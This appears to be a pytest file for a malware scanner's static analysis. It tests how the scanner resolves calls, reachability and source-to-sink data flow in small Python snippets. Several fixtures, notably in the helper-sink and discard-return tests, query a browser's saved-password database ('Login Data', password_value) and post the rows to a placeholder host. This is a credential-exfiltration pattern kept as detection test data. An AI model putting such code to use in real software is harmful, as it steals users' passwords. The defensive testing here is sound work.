"""Merged Phase 16 Python/Ren'Py call-resolution and flow authority gates."""
from __future__ import annotations

from contextlib import contextmanager
import os
from pathlib import Path

from Virus_Scan.contracts.artifact_read_snapshot import build_artifact_read_snapshot
from Virus_Scan.scanners.static_program_analysis import analyze_python_renpy_snapshot
from Virus_Scan.storage import scan_cache_repository, sqlite_lifecycle


@contextmanager
def _isolated_runtime(tmp_path: Path):
    previous = os.environ.get("UMIGE_BASE_DIR")
    sqlite_lifecycle().close()
    runtime_root = tmp_path / "runtime"
    os.environ["UMIGE_BASE_DIR"] = str(runtime_root)
    try:
        scan_cache_repository().configure(runtime_root / "profiles", enabled=True)
        yield
    finally:
        scan_cache_repository().configure(runtime_root / "profiles", enabled=False)
        sqlite_lifecycle().close()
        if previous is None:
            os.environ.pop("UMIGE_BASE_DIR", None)
        else:
            os.environ["UMIGE_BASE_DIR"] = previous


def _analysis(tmp_path: Path, name: str, source: str):
    target = tmp_path / name
    target.write_text(source, encoding="utf-8")
    return analyze_python_renpy_snapshot(build_artifact_read_snapshot(target)).analysis


def _operations(analysis, kind: str):
    return tuple(
        sorted(
            (item for item in analysis.operations if item.operation_kind == kind),
            key=lambda item: item.control_flow_ordinal,
        )
    )


def test_phase16_attribute_nested_and_class_names_cannot_promote_local_function_reachability(
    tmp_path: Path,
) -> None:
    with _isolated_runtime(tmp_path):
        attribute = _analysis(
            tmp_path,
            "attribute_collision.py",
            "import requests\n"
            "import subprocess\n"
            "def post():\n"
            "    subprocess.run(['cmd'])\n"
            "requests.post('https://example.invalid', data='ok')\n",
        )
        nested = _analysis(
            tmp_path,
            "nested_collision.py",
            "import subprocess\n"
            "def outer():\n"
            "    def hidden():\n"
            "        subprocess.run(['cmd'])\n"
            "hidden()\n",
        )
        method = _analysis(
            tmp_path,
            "method_collision.py",
            "import requests\n"
            "import subprocess\n"
            "class Client:\n"
            "    def post(self):\n"
            "        subprocess.run(['cmd'])\n"
            "requests.post('https://example.invalid', data='ok')\n",
        )

        assert _operations(attribute, "process_launch")[0].reachability_state == "locally_reachable"
        assert _operations(nested, "process_launch")[0].reachability_state == "locally_reachable"
        assert _operations(method, "process_launch")[0].reachability_state == "locally_reachable"
        assert len(_operations(attribute, "network_send")) == 1
        assert len(_operations(method, "network_send")) == 1


def test_phase16_dead_and_conditional_helper_calls_preserve_exact_reachability(
    tmp_path: Path,
) -> None:
    with _isolated_runtime(tmp_path):
        dead = _analysis(
            tmp_path,
            "dead_helper.py",
            "import subprocess\n"
            "def hidden():\n"
            "    subprocess.run(['cmd'])\n"
            "if False:\n"
            "    hidden()\n",
        )
        conditional = _analysis(
            tmp_path,
            "conditional_helper.py",
            "import subprocess\n"
            "def maybe():\n"
            "    subprocess.run(['cmd'])\n"
            "if flag:\n"
            "    maybe()\n",
        )

        assert _operations(dead, "process_launch")[0].reachability_state == "locally_reachable"
        assert _operations(conditional, "process_launch")[0].reachability_state == "conditionally_reachable"


def test_phase16_api_operations_require_canonical_builtin_or_import_binding(
    tmp_path: Path,
) -> None:
    with _isolated_runtime(tmp_path):
        local_open = _analysis(
            tmp_path,
            "local_open.py",
            "def open(path):\n"
            "    return None\n"
            "open('Browser/Login Data')\n",
        )
        shadowed_requests = _analysis(
            tmp_path,
            "shadowed_requests.py",
            "class Client:\n"
            "    def post(self, url, data=None):\n"
            "        return None\n"
            "requests = Client()\n"
            "requests.post('https://example.invalid', data='benign')\n",
        )
        unimported_requests = _analysis(
            tmp_path,
            "unimported_requests.py",
            "requests.post('https://example.invalid', data='benign')\n",
        )
        imported_alias = _analysis(
            tmp_path,
            "imported_alias.py",
            "from requests import post as send\n"
            "send('https://example.invalid', data='ok')\n",
        )

        assert not _operations(local_open, "file_open")
        assert not _operations(local_open, "credential_store_discovery")
        assert not _operations(shadowed_requests, "network_send")
        assert not _operations(shadowed_requests, "network_upload")
        assert not _operations(unimported_requests, "network_send")
        assert unimported_requests.parser_status == "partial"
        assert "dynamic_call_target" in unimported_requests.unresolved_constructs
        assert len(_operations(imported_alias, "network_send")) == 1
        assert len(_operations(imported_alias, "network_upload")) == 1


def test_phase16_source_flow_crosses_one_resolved_helper_parameter_boundary(
    tmp_path: Path,
) -> None:
    with _isolated_runtime(tmp_path):
        analysis = _analysis(
            tmp_path,
            "helper_sink.py",
            "import sqlite3, requests\n"
            "def send(data):\n"
            "    requests.post('https://example.invalid', data=data)\n"
            "connection = sqlite3.connect('Browser/Login Data')\n"
            "rows = connection.execute('SELECT password_value FROM logins')\n"
            "send(rows)\n",
        )

        source = _operations(analysis, "credential_store_query")[0]
        send = _operations(analysis, "network_send")[0]
        upload = _operations(analysis, "network_upload")[0]

        assert analysis.parser_status == "complete"
        assert source.flow_identity.startswith("flow_")
        assert {source.flow_identity, send.flow_identity, upload.flow_identity} == {
            source.flow_identity
        }
        assert send.reachability_state == "entrypoint_reachable"
        assert any(edge.edge_kind == "argument" for edge in analysis.flow_edges)
        assert any(edge.edge_kind == "source_to_sink" for edge in analysis.flow_edges)


def test_phase16_unproven_local_return_cannot_mint_source_to_sink_flow(
    tmp_path: Path,
) -> None:
    with _isolated_runtime(tmp_path):
        analysis = _analysis(
            tmp_path,
            "discard_return.py",
            "import sqlite3, requests\n"
            "def discard(data):\n"
            "    return 'ok'\n"
            "connection = sqlite3.connect('Browser/Login Data')\n"
            "rows = connection.execute('SELECT password_value FROM logins')\n"
            "payload = discard(rows)\n"
            "requests.post('https://example.invalid', data=payload)\n",
        )

        source = _operations(analysis, "credential_store_query")[0]
        send = _operations(analysis, "network_send")[0]

        assert source.flow_identity == ""
        assert send.flow_identity == ""
        assert analysis.parser_status == "partial"
        assert "interprocedural_return_flow_unresolved:discard" in analysis.unresolved_constructs
        assert not any(edge.edge_kind == "source_to_sink" for edge in analysis.flow_edges)


def test_phase16_unknown_outer_call_does_not_hide_nested_physical_operation(
    tmp_path: Path,
) -> None:
    with _isolated_runtime(tmp_path):
        analysis = _analysis(
            tmp_path,
            "nested_under_unknown.py",
            "import requests\n"
            "consume(requests.post('https://example.invalid', data='ok'))\n",
        )

        assert analysis.parser_status == "partial"
        assert "dynamic_call_target" in analysis.unresolved_constructs
        assert len(_operations(analysis, "network_send")) == 1
        assert len(_operations(analysis, "network_upload")) == 1
